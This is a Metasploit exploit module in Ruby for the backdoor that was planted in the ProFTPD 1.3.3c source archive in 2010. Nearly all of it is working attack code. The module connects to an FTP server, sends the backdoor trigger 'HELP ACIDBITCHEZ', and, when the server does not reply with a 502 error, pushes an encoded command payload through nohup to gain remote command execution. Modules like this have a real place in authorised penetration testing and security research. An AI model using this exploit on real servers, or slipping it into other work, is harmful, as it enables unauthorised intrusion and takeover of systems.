##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ProFTPD-1.3.3c Backdoor Command Execution',
      'Description'    => %q{
          This module exploits a malicious backdoor that was added to the
        ProFTPD download archive. This backdoor was present in the proftpd-1.3.3c.tar.[bz2|gz]
        archive between November 28th 2010 and 2nd December 2010.
      },
      'Author'         => [ 'MC', 'darkharper2' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '69562'],
          [ 'BID', '45150' ]
        ],
      'Privileged'     => true,
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'    => 2000,
          'BadChars' => '',
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl telnet',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => 'Dec 2 2010',
      'DefaultTarget' => 0))

    deregister_options('FTPUSER', 'FTPPASS')
  end

  def exploit

    connect

    print_status("Sending Backdoor Command")
    sock.put("HELP ACIDBITCHEZ\r\n")

    res = sock.get_once(-1,10)

    if ( res and res =~ /502/ )
      print_error("Not backdoored")
    else
      sock.put("nohup " + payload.encoded + " >/dev/null 2>&1\n")
      handler
    end

    disconnect

  end
end